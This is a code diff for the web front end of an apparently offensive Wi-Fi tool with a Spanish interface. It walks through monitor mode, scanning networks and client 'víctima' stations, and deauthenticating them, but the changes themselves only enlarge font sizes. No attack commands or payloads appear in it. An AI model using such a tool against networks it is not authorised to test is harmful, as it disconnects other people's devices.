+    h+=`<div style="font-size:12px;color:var(--g);letter-spacing:1px;margin-bottom:4px">${aps.length} REDES — <span style="color:var(--cyan)">click fila → BSSID+CH</span></div>`;
+    h+='<table style="width:100%;border-collapse:collapse;font-size:13px;font-family:\'JetBrains Mono\',monospace">';
+    h+='<tr style="color:var(--mut);font-size:12px"><td style="padding:2px 5px">BSSID</td><td style="padding:2px 5px">ESSID</td><td style="padding:2px 5px">CH</td><td style="padding:2px 5px">PWR</td><td style="padding:2px 5px">ENC</td></tr>';
     for(const ap of aps){
       const pc=parseInt(ap.pwr)>-60?'var(--g)':parseInt(ap.pwr)>-75?'var(--yellow)':'var(--mut)';
       const ec=ap.enc==='OPN'?'var(--red)':'var(--cyan)';
@@ -3614,9 +3730,9 @@ function _wdDraw(){
     h+='</table>';
   }
   if(stations.length){
-    h+=`<div style="font-size:7px;color:var(--yellow);letter-spacing:1px;margin:8px 0 4px">${stations.length} DISPOSITIVOS — <span style="color:var(--yellow)">click fila → STATION</span></div>`;
-    h+='<table style="width:100%;border-collapse:collapse;font-size:8px;font-family:\'JetBrains Mono\',monospace">';
-    h+='<tr style="color:var(--mut);font-size:7px"><td style="padding:2px 5px">STATION (víctima)</td><td style="padding:2px 5px">BSSID AP</td><td style="padding:2px 5px">PWR</td></tr>';
+    h+=`<div style="font-size:12px;color:var(--yellow);letter-spacing:1px;margin:8px 0 4px">${stations.length} DISPOSITIVOS — <span style="color:var(--yellow)">click fila → STATION</span></div>`;
+    h+='<table style="width:100%;border-collapse:collapse;font-size:13px;font-family:\'JetBrains Mono\',monospace">';
+    h+='<tr style="color:var(--mut);font-size:12px"><td style="padding:2px 5px">STATION (víctima)</td><td style="padding:2px 5px">BSSID AP</td><td style="padding:2px 5px">PWR</td></tr>';
     for(const st of stations){
       h+=`<tr onclick="wdSelectStation('${st.station}')" style="cursor:pointer;border-top:1px solid #0d160f" onmouseover="this.style.background='#0a0800'" onmouseout="this.style.background=''">`;
       h+=`<td style="padding:3px 5px;color:var(--yellow)">${st.station}</td><td style="padding:3px 5px;color:var(--mut)">${st.bssid}</td><td style="padding:3px 5px;color:var(--mut)">${st.pwr}</td></tr>`;
@@ -3635,7 +3751,7 @@ function wdUpdateDeauthBar(){
 function wdShowDisconnected(){
   const ds=document.getElementById('wd-deauth-status'); if(!ds)return;
   ds.style.borderColor='var(--g)'; ds.style.background='#020a03';
-  ds.innerHTML=`<span style="color:var(--g);font-size:9px">✓ DISPOSITIVO DESCONECTADO</span>  <span style="color:var(--mut)">${gv('wd-st')||''}</span>`;
+  ds.innerHTML=`<span style="color:var(--g);font-size:14px">✓ DISPOSITIVO DESCONECTADO</span>  <span style="color:var(--mut)">${gv('wd-st')||''}</span>`;
 }
 
 function wdSelectAP(bssid,ch){
@@ -3686,14 +3802,14 @@ function wdAutoStop(step){
   const lc=document.getElementById('wd-live-content');
   if(step===2){
     const msg=aps.length
-      ? `<div style="font-size:7px;color:var(--g);padding:3px 0 6px">✓ Escaneo completo — ${aps.length} redes. Click en fila para seleccionar BSSID+CH.</div>`
-      : `<div style="font-size:8px;color:var(--yellow);padding:6px 0">Sin redes encontradas. Verifica la interfaz MON.</div>`;
+      ? `<div style="font-size:12px;color:var(--g);padding:3px 0 6px">✓ Escaneo completo — ${aps.length} redes. Click en fila para seleccionar BSSID+CH.</div>`
+      : `<div style="font-size:13px;color:var(--yellow);padding:6px 0">Sin redes encontradas. Verifica la interfaz MON.</div>`;
     if(lc)lc.insertAdjacentHTML('afterbegin',msg);
   }
   if(step===3){
     const msg=stations.length
-      ? `<div style="font-size:7px;color:var(--g);padding:3px 0 6px">✓ Escaneo completo — ${stations.length} dispositivos. Click en fila para seleccionar STATION.</div>`
-      : `<div style="font-size:8px;color:var(--yellow);padding:6px 0">Sin dispositivos visibles. Espera más o prueba con --band a para 5GHz.</div>`;
+      ? `<div style="font-size:12px;color:var(--g);padding:3px 0 6px">✓ Escaneo completo — ${stations.length} dispositivos. Click en fila para seleccionar STATION.</div>`
+      : `<div style="font-size:13px;color:var(--yellow);padding:6px 0">Sin dispositivos visibles. Espera más o prueba con --band a para 5GHz.</div>`;
     if(lc)lc.insertAdjacentHTML('afterbegin',msg);
   }
 }
@@ -3703,13 +3819,13 @@ function wdRun(step,btn){
   wdState.step=step;
   if(step===2){
     wdState.aps={};
-    wdLive(`<div style="font-size:8px;color:var(--mut);padding:4px 0">Escaneando redes... para automáticamente en <span id="wd-cd-n" style="color:var(--cyan)">15</span>s</div>`);
+    wdLive(`<div style="font-size:13px;color:var(--mut);padding:4px 0">Escaneando redes... para automáticamente en <span id="wd-cd-n" style="color:var(--cyan)">15</span>s</div>`);
     wdStartCountdown(15);
     wdState.autoStopTimer=setTimeout(()=>wdAutoStop(2),15000);
   }
   if(step===3){
     wdState.stations={};
-    wdLive(`<div style="font-size:8px;color:var(--mut);padding:4px 0">Escaneando dispositivos... para automáticamente en <span id="wd-cd-n" style="color:var(--cyan)">10</span>s</div>`);
+    wdLive(`<div style="font-size:13px;color:var(--mut);padding:4px 0">Escaneando dispositivos... para automáticamente en <span id="wd-cd-n" style="color:var(--cyan)">10</span>s</div>`);
     wdStartCountdown(10);
     wdState.autoStopTimer=setTimeout(()=>wdAutoStop(3),10000);
   }
@@ -3739,7 +3855,7 @@ function wdStop(){
 function wdClearState(){
   wdClearTimers();
   wdState.aps={};wdState.stations={};wdState.step=0;wdState.deauthPkts=0;wdState.disconnected=false;
-  wdLive('<div style="font-size:8px;color:var(--dim);font-style:italic;padding:8px 0;text-align:center">Pon la interfaz arriba y ejecuta PASO 1</div>');
+  wdLive('<div style="font-size:13px;color:var(--dim);font-style:italic;padding:8px 0;text-align:center">Pon la interfaz arriba y ejecuta PASO 1</div>');
   const ds=document.getElementById('wd-deauth-status');if(ds){ds.style.display='none';ds.innerHTML='';}
   [2,3,4].forEach(n=>{const c=document.getElementById('wd-card-'+n);if(c){c.style.opacity='.5';c.style.pointerEvents='none';}});
 }
@@ -3750,7 +3866,7 @@ onDoneHooks.wd=function(){
   wdResetBtn('▶ RUN');
   if(wdState.step===1){
     const mon=gv('wd-mon')||((gv('wd-if')||'wlan0')+'mon');
-    wdLive(`<div style="padding:6px 2px"><span style="color:var(--g);font-size:9px">✓ MODO MONITOR ACTIVADO</span><br><span style="color:var(--mut);font-size:8px">Interfaz: </span><span style="color:var(--cyan);font-size:8px">${mon}</span><span style="color:var(--dim);font-size:7px;margin-left:10px">→ Ejecuta PASO 2 para escanear redes</span></div>`);
+    wdLive(`<div style="padding:6px 2px"><span style="color:var(--g);font-size:14px">✓ MODO MONITOR ACTIVADO</span><br><span style="color:var(--mut);font-size:13px">Interfaz: </span><span style="color:var(--cyan);font-size:13px">${mon}</span><span style="color:var(--dim);font-size:12px;margin-left:10px">→ Ejecuta PASO 2 para escanear redes</span></div>`);
     wdUnlock(2);
   }
 };
@@ -3795,7 +3911,7 @@ async function execCmd(cmd, outCId, outAreaId, prefix) {
 
   if (!serverOk) {
     if (!isLive) appendOut(outCId, '[OFFLINE] Servidor no disponible\n→ Ejecuta: python3 server.py', 'err');
-    else wdLive('<div style="font-size:8px;color:var(--red);padding:4px 0">⚠ Servidor offline — ejecuta python3 server.py</div>');
+    else wdLive('<div style="font-size:13px;color:var(--red);padding:4px 0">⚠ Servidor offline — ejecuta python3 server.py</div>');
     if (runBtn) { runBtn.classList.remove('running'); runBtn.textContent = '▶ EJECUTAR'; }
     if (stopBtn) stopBtn.disabled = true;
     return;
@@ -3809,7 +3925,7 @@ async function execCmd(cmd, outCId, outAreaId, prefix) {
     const { job_id, error } = await resp.json();
     if (error) {
       if (!isLive) appendOut(outCId, '⚠ Error: ' + error, 'err');
-      else wdLive(`<div style="font-size:8px;color:var(--red);padding:4px 0">⚠ ${error}</div>`);
+      else wdLive(`<div style="font-size:13px;color:var(--red);padding:4px 0">⚠ ${error}</div>`);
       if (runBtn) { runBtn.classList.remove('running'); runBtn.textContent = '▶ EJECUTAR'; }
       if (stopBtn) stopBtn.disabled = true;
       return;
@@ -3857,7 +3973,7 @@ async function execCmd(cmd, outCId, outAreaId, prefix) {
         }
       } else if (msg.type === 'error') {
         if (!isLive) appendOut(outCId, '⚠ ' + msg.data, 'err');
-        else wdLive(`<div style="font-size:8px;color:var(--red);padding:4px 0">⚠ ${msg.data}</div>`);
+        else wdLive(`<div style="font-size:13px;color:var(--red);padding:4px 0">⚠ ${msg.data}</div>`);
         es.close();
       }
     };
@@ -3974,8 +4090,8 @@ async function loadFiles() {
   const el = document.getElementById('files-content');
   let html = '';
   for (const [dir, files] of Object.entries(data)) {
-    html += `<div style="color:var(--g);font-weight:700;margin:9px 0 4px;font-size:8px">${dir}/</div>`;
-    if (!files.length) { html += '<div style="color:var(--dim);padding-left:10px;font-size:8px">vacío</div>'; continue; }
+    html += `<div style="color:var(--g);font-weight:700;margin:9px 0 4px;font-size:13px">${dir}/</div>`;
+    if (!files.length) { html += '<div style="color:var(--dim);padding-left:10px;font-size:13px">vacío</div>'; continue; }
     html += files.map(f =>
       `<div class="pitem" style="margin-bottom:2px">
         <span class="ptxt">${f.is_dir ? '▸' : '▪'} ${f.name} <span style="color:var(--dim)">${f.is_dir ? '' : fmt(f.size)}</span></span>
